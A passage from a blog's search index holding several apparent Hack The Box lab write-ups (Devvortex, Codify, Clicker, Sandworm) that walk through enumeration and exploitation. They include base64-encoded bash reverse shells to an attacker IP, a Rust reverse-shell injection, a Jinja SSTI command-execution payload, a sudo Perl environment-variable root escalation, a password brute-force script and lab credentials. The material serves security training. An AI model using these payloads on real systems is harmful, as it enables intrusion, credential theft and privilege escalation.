http://dev.devvortex.htb/index.php. So we have PHP being used.\nFound a Joomla Administrator Login page at\nhttp://dev.devvortex.htb/administrator/\nAlso ran nmap with same parameters against dev.devvortex.htb and found a robots.txt. The sites included again signal this is a site using Joomla CMS. Then I found that I can get the version by going to http://dev.devvortex.htb/README.txt. The version of Joomla CMS being used is 4.1. After searching for a public CVE I found this link. This allows us to send a HTTP request with curl like this:\ncurl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true -o out.json This gets us a JSON output which we can prettify with jq . pretty-out.json. Inside we can find the database username and password.\nThen I enumerate all the possible usernames I found at the index pages and tried to SSH with crackmapexec. None worked. Then I logged in to /administrator/. This worked.\nAdmin panel #When we first login we find a security alert saying the site is using PHP 7.4.3 which is an outdated version. We are also a SuperUser and there is another user called logan. We can then create our own PHP file under /templates/casiopeia that spawns a reverse shell.\nInitial shell #We are the www-data user. We can check the MySQL database with the credentials we found earlier. We find the user logan and his hash. Interestingly he\u0026rsquo;s also a user on the box. So when we crack his bcrypt hash with:\nhashcat -m 3200 hash /usr/share/wordlists/rockyou.txt we get his password and we can SSH as him.\nPrivilege escalation to root #We can run sudo -l to see if we can run any commands because we have the password. We see sudo is using an old version so we could exploit that. We see an old Ubuntu is running so we could try to exploit that. But first we can run the apport-cli as sudo, as shown here:\nWhile we run it the program with sudo, we have the option to view logs. If we select that and wait, we get thrown into a less pager. Inside it we can simply run any shell command with !/command/to/run. So we run !/bin/bash and voila, we have a root shell. Pwned!\nPost privilege escalation #Can we exploit sudo or the old version of Ubuntu that is running?\nTrying to get the sudo exploit to work failed. Even tho the sudo version is 1.8.31 the exploit and the test still don\u0026rsquo;t work for some reason.\n","date":"6 February 2024","permalink":"https://cruxqsec.github.io/writeups/htb-devvortex/","section":"","summary":"Easy difficulty Linux machine from Hack the box","title":"HTB Devvortex"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/information-disclosure/","section":"tags","summary":"","title":"information-disclosure"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/joomla-cms/","section":"tags","summary":"","title":"joomla-cms"},{"content":"Enumeration #Running a starting nmap scan:\nnmap -sC -sV 10.10.11.239 -oA nmap/nmap At port 80 we find a webserver with the hostname of codify.htb which we add into /etc/hosts. If we curl it, it says the document has moved to codify.htb. So both these open services are basically the same thing - a simple code editor for NodeJS with \u0026ldquo;limited\u0026rdquo; functionality. The allowed modules are specified on the site.\nIt is apparently using a sandboxing tool called vm2 (the links points out to the 3.9.16 version). If we search for any publicly available exploits we find there are some available. We will search for those later.\nLooking at the editor and the list of allowed modules we can easily enumerate some basic info about the system.\nLet\u0026rsquo;s try to find a way to read files even without fs module. Found a way to import the fs/promises module with var fs = require('fs/promises'). But could not read the file because I was getting [Object Promise] returned. Tried some more tricks but none of them worked.\ngobuster virtual host enumeration found no subdomains. It also didn\u0026rsquo;t find any files.\nInitial foothold #So returning back to the vm2 library I found a sandbox escape with which we get RCE.\nWith this code we can execute commands. I tried to execute a reverse shell with bash and with nc but was unsuccessful. I gave up on trying other things so I just generated a SSH key with ssh-keygen and wrote it inside\n/home/srv/.ssh/authorized_keys and logged into the box.\nI got the users with\ncat /etc/passwd | grep bash We find out that this is not the user because it doesn\u0026rsquo;t have the user.txt.\nI searched the web root directory and found /var/www/contacts and inside it there was a tickets.db file which is a Sqlite3 database. Inside that I found a hash which I tried to crack using john and hashcat. hashcat found the correct password of spongebob1 using rockyou.txt.\nPrivilege escalation #I found a command we can run with sudo by using sudo -l. It\u0026rsquo;s a custom script that backups the MySQL database.\n#!/bin/bash DB_USER=\u0026#34;root\u0026#34; DB_PASS=$(/usr/bin/cat /root/.creds) BACKUP_DIR=\u0026#34;/var/backups/mysql\u0026#34; read -s -p \u0026#34;Enter MySQL password for $DB_USER: \u0026#34; USER_PASS /usr/bin/echo if [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo \u0026#34;Password confirmed!\u0026#34; else /usr/bin/echo \u0026#34;Password confirmation failed!\u0026#34; exit 1 fi /usr/bin/mkdir -p \u0026#34;$BACKUP_DIR\u0026#34; databases=$(/usr/bin/mysql -u \u0026#34;$DB_USER\u0026#34; -h 0.0.0.0 -P 3306 -p\u0026#34;$DB_PASS\u0026#34; -e \u0026#34;SHOW DATABASES;\u0026#34; | /usr/bin/grep -Ev \u0026#34;(Database|information_schema|performance_schema)\u0026#34;) for db in $databases; do /usr/bin/echo \u0026#34;Backing up database: $db\u0026#34; /usr/bin/mysqldump --force -u \u0026#34;$DB_USER\u0026#34; -h 0.0.0.0 -P 3306 -p\u0026#34;$DB_PASS\u0026#34; \u0026#34;$db\u0026#34; | /usr/bin/gzip \u0026gt; \u0026#34;$BACKUP_DIR/$db.sql.gz\u0026#34; done /usr/bin/echo \u0026#34;All databases backed up successfully!\u0026#34; /usr/bin/echo \u0026#34;Changing the permissions\u0026#34; /usr/bin/chown root:sys-adm \u0026#34;$BACKUP_DIR\u0026#34; /usr/bin/chmod 774 -R \u0026#34;$BACKUP_DIR\u0026#34; /usr/bin/echo \u0026#39;Done!\u0026#39; With some help I found out that we can bruteforce this script because bash is vulnerable to regex matching. This means that if a password test is compared to t* or tes* it will succeed (the * char matches all characters). So this means we can bruteforce this script by simply trying all characters and adding * at the end and checking if it succeeds. So again using some help (writeup) and on my own I wrote a simple Python script.\nimport subprocess import string all_chars = string.ascii_letters + string.digits found = False character = \u0026#34;\u0026#34; password = \u0026#34;\u0026#34; while not found: for c in all_chars: character = f\u0026#34;{c}*\u0026#34; command = f\u0026#34;/usr/bin/echo {password}{character} | sudo /opt/scripts/mysql_backup.sh\u0026#34; result = subprocess.run(command, stdout=subprocess.PIPE, shell=True, text=True).stdout if \u0026#34;Password confirmed!\u0026#34; in result: password += c print(password) After running it we get the password kljh12k3jhaskjh12kjh3 which is the root password. So we can loggin with \u0026lt;kbd.su because root login seems to be dissallowed from SSH. Pwned!\n","date":"15 January 2024","permalink":"https://cruxqsec.github.io/writeups/htb-codify/","section":"","summary":"Easy difficulty Linux machine from Hack the box","title":"HTB Codify"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/file-upload/","section":"tags","summary":"","title":"file-upload"},{"content":"Enumeration #We start with a port scan:\nmkdir nmap sudo nmap -sC -sV 10.10.11.232 -oA nmap/nmap Services #OpenSSH has no interesting CVEs. Apache has a HTTP request smuggling CVE and some others but none that could be currently useful (link to CVEs). prcbind is also not vulnerable to anything except DDOS attacks. We also have nfs_acl 3 open, which means we may have a share we can read. We can use showmount:\nshowmount -e clicker.htb shows we have one share available. We can mount it and we find the website source inside the zip file.\nWebsite #Looking at the source code we find many interesting things. Firstly we have a diagnostic.php which takes a special token with a md5 hash. So in the background I ran:\njohn --format=Raw-MD5 --mask=?a --min-length=1 --max-length=7 hash which uses a mask of all ASCII characters it\u0026rsquo;s max length being 7. Then I looked onward and found a db_utils.php which has the MySQL database information and some functions to query from the database. There is this function:\nfunction get_top_players($number) { global $pdo; # sql injection (we are appending output to the SQL query) $stmt = $pdo-\u0026gt;query(\u0026#34;SELECT nickname,clicks,level FROM players WHERE clicks \u0026gt;= \u0026#34; . $number); $result = $stmt-\u0026gt;fetchAll(PDO::FETCH_ASSOC); return $result; } This function has a clear SQL Injection vulnerability. But we have to be an admin to access it. So how can we change our role. The role we are assigned when we register is user. But there is also a save_profile function where we update our stats. And this is the only place we could change our role but there is this code preventing it:\nif (isset($_SESSION[\u0026#39;PLAYER\u0026#39;]) \u0026amp;\u0026amp; $_SESSION[\u0026#39;PLAYER\u0026#39;] != \u0026#34;\u0026#34;) { $args = []; foreach($_GET as $key=\u0026gt;$value) { # here we are not allowed to set the role as a GET parameter if (strtolower($key) === \u0026#39;role\u0026#39;) { // prevent malicious users to modify role header(\u0026#39;Location: /index.php?err=Malicious activity detected!\u0026#39;); die; } $args[$key] = $value; } save_profile($_SESSION[\u0026#39;PLAYER\u0026#39;], $_GET); // update session info $_SESSION[\u0026#39;CLICKS\u0026#39;] = $_GET[\u0026#39;clicks\u0026#39;]; $_SESSION[\u0026#39;LEVEL\u0026#39;] = $_GET[\u0026#39;level\u0026#39;]; header(\u0026#39;Location: /index.php?msg=Game has been saved!\u0026#39;); } So because of this check we can\u0026rsquo;t set our role, but could we somehow bypass it? We can using CRLF Injection. We can add a role=Admin to the GET header that is sent when saving the game. But this is redirected and the error message is displayed as we have not bypassed it, but if we add role%0d%0a=Admin the %0d%0a this check is bypassed and the role is changed. We just logout and login and we have access to the administration panel. In the administration panel we can export the stats which goes to the function that has an SQL injection. But there is this PHP filter function in the way is_numeric() which checks if the variable is a number(int, float, etc.). So I couldn\u0026rsquo;t find a way to bypass. But then we see we can change the extension of the exported file to php. This allows us to create a PHP file. We see we can control the nickname that is written to the file (it\u0026rsquo;s the database parameter of players table). We can change our nickname in the same way we did with setting role (we don\u0026rsquo;t have to bypass it with %0d%0a because there is no check). So we upload some PHP code with a reverse shell:\n\u0026lt;?php system(\u0026#34;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOC8zMDAxIDA+JjEK | base64 -d | bash\u0026#34;); ?\u0026gt; Privilege escalation #Jack #This gets us on the box. We can then check the database with the credentials we found in db_utils.php. We find some hashes which aren\u0026rsquo;t cracked with the rockyou.txt password list. We run some enum and find a execute_query binary under /opt/manage. It has SUID bit set and the owner is jack. When we decompile it with ghidra and look at it we see we have some arguments we have to input.\nWe can use ./execute_query [0-4] to run a query. (1 runs create.sql, 2 runs populate.sql, 3 runs reset_password, 4 runs clean sql). The default switch branch goes into a block that executes system. While running strace we see we can open files with ./execute_query 5 ../../../etc/passwd (we are inside /home/jack/queries as show by strace). This opens /etc/passwd. So now we can create a file like this:\nsystem echo echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOC8zMDAxIDA+JjEK | base64 -d | bash; We put this inside /tmp/test and run ./execute_query 5 ../../../tmp/test and we get a reverse shell as jack. Then we find an SSH private key inside /home/jack/.ssh and we can SSH into the box.\nRoot #Then we look around and fint this script at /opt/monitor.sh:\n#!/bin/bash if [ \u0026#34;$EUID\u0026#34; -ne 0 ] then echo \u0026#34;Error, please run as root\u0026#34; exit fi set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin unset PERL5LIB; unset PERLLIB; data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token); /usr/bin/xml_pp \u0026lt;\u0026lt;\u0026lt; $data; if [[ $NOSAVE == \u0026#34;true\u0026#34; ]]; then exit; else timestamp=$(/usr/bin/date +%s) /usr/bin/echo $data \u0026gt; /root/diagnostic_files/diagnostic_${timestamp}.xml fi So here I tried to look if I had any write permissions to any of the folders. With sudo -l we can see we have SETENV option allowed which means we can specify environment variables before running monitor.sh.\nBy finding this writeup which is ironically using this box as an example we can set PERL5OPT and PERL5DB to execute commands:\nsudo PERL5OPT=-d PERL5DB=\u0026#39;system(\u0026#34;chmod u+s /bin/bash\u0026#34;)\u0026#39; ./monitor.sh makes /bin/bash a root SUID binary. So what we just did was inject PERL environment variables into the script to make it execute our own code. Pwned!\n","date":"15 December 2023","permalink":"https://cruxqsec.github.io/writeups/htb-clicker/","section":"","summary":"Medium difficulty Linux machine from Hack the box","title":"HTB Clicker"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/xxe/","section":"tags","summary":"","title":"xxe"},{"content":"Enumeration #First we start with a port scan:\nsudo nmap -sC -sV 10.10.11.218 -oA nmap/nmap Then we check the website and see it redirects us to ssa.htb. We get redirected to https://ssa.htb. We add it to /etc/hosts and run nmap again just this time we don\u0026rsquo;t specify the IP but the domain\nnmap will use additional scripts for the domain. Meanwhile we will check the site we run:\nsudo nmap -p- ssa.htb -T4 -oA nmap/nmap-ssa-all` to scan all ports. We find no more open ports. Then we can try virtual host enumeration with gobuster :\ngobuster vhost -u https://ssa.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k We also get no results.\nNext we can try to bruteforce the directories. We could also use gobuster but I just used feroxbuster.\nferoxbuster -u https://ssa.htb/ -k Website #Looking at the website we can find that at the bottom it says Powered by Flask which probably signals the website is using Python Flask.\nFrom the feroxbuster enumeration we can now check the endpoints.\n/admin, /view, /logout redirects to a login page so we can assume you have to be logged in to view them.\n/login is a simple login page.\n/about simple about page.\n/pgp we can download the public PGP key and import it with\ngpg --import key-file We get an email atlas@ssa.htb which is also mentioned in the /guide.\n/contact has a form in which we can send a message encrypted with their public key.\n/guide has a guide and many forms for experiment with decrypting, encrypting, validating signatures and more.\nI tried a simple XSS by encrypting \u0026lt;h1\u0026gt; Hello world \u0026lt;/h1\u0026gt; and seeing if the HTML will parse, but it didn\u0026rsquo;t work. Signature give this message:\n/process interestingly only allows POST requests but after we try to send it we get a 400 Bad Request. So we probably have to figure out how to correctly send it.\nHow does the site work #As we discerned earlier this site is probably using Python and the Flask Web framework. We don\u0026rsquo;t have any version information. We could also presuppose some things: firstly that there is database, because we have a login and secondly that there could be a templating engine being used. So there are 2 logical attacks that could follow from this - SQL Injection and Server side template injection (SSTI). We also see in the /login page we are getting a\nSet-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.ZU0zrg.tx3vcFTUmmremG-uGUzJo7qiCTk Let\u0026rsquo;s check it using it jwt.io I get the following result:\nSo there seems to be a message but the site says the JSON token is invalid as is it\u0026rsquo;s signature.\nI found this Python module flask-unsign which does exactly what I was hoping for. If I give it the session cookie to decode it outputs:\n$ flask-unsign --decode --cookie \\ \u0026#34;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ.ZU9bXQ._r0fMGNanB0524wEH9qLG8rtjJg\u0026#34; output: {\u0026#39;_flashes\u0026#39;: [(\u0026#39;message\u0026#39;, \u0026#39;Please log in to access this page.\u0026#39;)]} SQL Injection #There are many possibilities for which database engine is being used. MySQL or MariaDB, SQLite could be used or perhaps PostgresSQL. Or maybe some other. We don\u0026rsquo;t know. Using sql map on all the meaningful sites doesn\u0026rsquo;t yield any results.\nSSTI #JINJA, Mako or Tornado could be used as a templating engine. When testing the Signature Validation under /guide we come across a prompt that I pasted earlier with which we get our gpg key name reflected. So if we try to input the {{7 * 7}} as the name we get this:\nFoothold #So I proceeded by writing a script that automates the process of generating a key with gpg --key-generate and the payload inside the name, getting the public key, getting the signed clear text with gpg -u key_id --clear-sign --armor and then sending the POST request to /process.\nimport subprocess import os import requests url = \u0026#34;https://ssa.htb/process\u0026#34; proxies = { \u0026#34;https\u0026#34; : \u0026#34;http://127.0.0.1:8080\u0026#34; } def gen_key(payload): #we have to create a file with all the key info and then generate it cmd = f\u0026#34;\u0026#34;\u0026#34; echo \u0026#34;Key-Type: RSA\u0026#34; \u0026gt; key-details; echo \u0026#34;Key-Length: 4096\u0026#34; \u0026gt;\u0026gt; key-details; echo \u0026#34;Name-Real: {payload}\u0026#34; \u0026gt;\u0026gt; key-details; echo \u0026#34;Name-Email: your_email@example.com\u0026#34; \u0026gt;\u0026gt; key-details; echo \u0026#34;Expire-Date: 0\u0026#34; \u0026gt;\u0026gt; key-details; echo \u0026#34;%no-ask-passphrase\u0026#34; \u0026gt;\u0026gt; key-details; echo \u0026#34;%no-protection\u0026#34; \u0026gt;\u0026gt; key-details; gpg --batch --gen-key key-details \u0026#34;\u0026#34;\u0026#34; # prints response to stderr for some reason result = subprocess.run(cmd, capture_output=True, shell=True, text=True).stderr # we get the key_id from gpg output key_id = result.split(\u0026#34;.\u0026#34;)[-2][2:] return key_id def get_clear_sig(key_id): os.system(f\u0026#34;gpg -u {key_id} --clear-sign --armor file.txt\u0026#34;) result = subprocess.run(f\u0026#34;cat file.txt.asc\u0026#34;,capture_output=True, shell=True, text=True).stdout os.system(\u0026#34;rm file.txt.asc\u0026#34;) return result def get_public_key(key_id): cmd = f\u0026#34;gpg -u {key_id} --export --armor\u0026#34; result = subprocess.run(cmd, capture_output=True, shell=True, text=True).stdout return result def delete_key(key_id): os.system(f\u0026#34;gpg --batch --yes --delete-secret-and-public-key {key_id}\u0026#34;) while True: payload = input(\u0026#34;$ \u0026#34;) # create key with SSTI payload key_id = gen_key(payload) # get public key pub_key = get_public_key(key_id) # get clear sign signature sign_text = get_clear_sig(key_id) data = { \u0026#39;signed_text\u0026#39; : sign_text, \u0026#39;public_key\u0026#39; : pub_key } req = requests.post(url, data=data, proxies=proxies, verify=False) if req.status_code == 200: print(req.content.decode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;----------------------------------\u0026#34;) else: print(\u0026#34;http error\u0026#34;) delete_key(key_id) By sending {{config}} as the payload we get the Flask configuration data in which we get the SESSION SECRET: 91668c1bc67132e3dcfb5b1a3e0c5c21 and the MySQL information mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA.\nWe can also get RCE with :\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\u0026#39;cat /etc/passwd\u0026#39;).read() }} So we can get the users that are in the box by reading /etc/passwd :\nSo then we can make a users.txt with the usernames and try\ncrackmapexec ssh ssa.htb -u users.txt -p \u0026#39;GarlicAndOnionZ42\u0026#39; to SSH into the box. It fails. But we can upload a reverse shell that is Base64 encoded and we get onto the box.\nPrivilege escalation #So now we\u0026rsquo;re on the box. We are the user atlas and right from the start we see we are in a limited environment. There are no basic commands such as file, rm and others. We can\u0026rsquo;t even normally print the environment variables, because there is no env command. So we have to cat /proc/self/environ to get the environmet variables. And we can see from this variable container=firejail that we are probably in a firejail sandbox.\nBreaking out of Firejail #Firejail is a security sandbox tool designed to improve the security of applications by isolating them in a sandbox environment with less functionality. I tried to run a firejail exploit but to no avail as we have really limited binary access and we can\u0026rsquo;t even find out what firejail version we are running.\nSo I just started to search around and eventualy I stumbled accross this file in the home directory ~/.config/httpie/sessions/localhost_5000/admin.json.\nInside it I found the password for the user silentobserver:quietLiketheWind22. Trying to SSH in the box we get in.\nSilent observer #So now that we\u0026rsquo;re the silentobserver user we have a normal shell and we are not in firejail sandbox anymore. So first I ran linpeas.sh and pspy64.\nThen I checked the database with the credentials we got earlier and found 2 hashes. Cracking the hashes is not as straightforward as it seems because the hashes are somewhat custom, made with werkzeug python library. But I found this repository which has a custom cracker. I just left it running in the background while I do other things.\npspy64 outputs some interesting stuff:\nSo we see there is a custom script being run by root at /root/Cleanup/clean.sh.\nI tried to upload a custom binary to a writeable $PATH which is inside\n/home/silentobserver/.local/bin and name the binary sleep as we see sleep being executed - but it doesn\u0026rsquo;t work.\nWe see cargo is being run which is a Rusts package manager. Then we see another program being run which is tipnet. Searching for it online doesn\u0026rsquo;t give any meaningful results so this may be a custom program. We can use scp -r silentobserver@ssa.htb:/opt/tipnet . to download the build scripts and the source code.\nThe download took too long so I just looked a the source code at /opt/tipnet/src/main.rs. We can immediately find database it connects to by looking at the connect_to_db() function. We find the basic information including the database password\nmysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream.\nWe also see that there is a compilation going with rustc where the user atlas compiles the opt/tipnet/src/main.rs and /opt/crates/logger/src/lib.rs files into a binary inside /opt/tipnet/target/debug/tipnet with SUID of the user atlas. We can then add code to the lib.rs:\nuse std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; // this goes inside the log function // reverse shell let s = TcpStream::connect(\u0026#34;my-ip:3001\u0026#34;).unwrap(); let fd = s.as_raw_fd(); Command::new(\u0026#34;/bin/sh\u0026#34;) .arg(\u0026#34;-i\u0026#34;) .stdin(unsafe { Stdio::from_raw_fd(fd) }) .stdout(unsafe { Stdio::from_raw_fd(fd) }) .stderr(unsafe { Stdio::from_raw_fd(fd) }) .spawn() .unwrap() .wait() .unwrap(); Then we set up a listener on our machine\nnc -lvnp 3001 and this spawns a shell. If we execute id we can see we are the atlas user and we are in the jailer group. If we remember earlier I tried to execute a firejail exploit which didn\u0026rsquo;t work because we were inside a sandbox. Now we can navigate to /usr/local/bin/firejail and run firejail --version. It\u0026rsquo;s version is 0.9.68 which is vulnerable to the earlier exploit. I upload it and follow its instructions and we get root. Pwned!\nPost exploitation #Now we are root. Let\u0026rsquo;s try a few things:\nDump SSH credentials Try to crack the hashes we got earlier Read the source code of the webapp and it\u0026rsquo;s configuration (including firejail) Reading the source code #I was sloppy and missed that there is another passphrase in the source code inside app.py. It\u0026rsquo;s the PGP private key password $M1DGu4rD$. This password is the password for the user Odin that was found inside the database with the hashes.\nCracking the passwords #Cracking the hashes proves quite difficult, hashcat and john have no formats for this hash. Trying to reformat it also didn\u0026rsquo;t work. But using werkzeug-cracker worked. But this script is slow so if I didn\u0026rsquo;t already know the passwords it would take quite a long time.\nDumping the credentials #Using strace we can see the password that was input. Maybe we should check some script or write our own.\n","date":"20 August 2023","permalink":"https://cruxqsec.github.io/writeups/htb-sandworm/","section":"","summary":"Medium difficulty Linux machine from Hack the box","title":"HTB Sandworm"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/tags/ssti/","section":"tags","summary":"","title":"ssti"},{"content":"","date":null,"permalink":"https://cruxqsec.github.io/categories/","section":"categories","summary":"","title":"categories"}]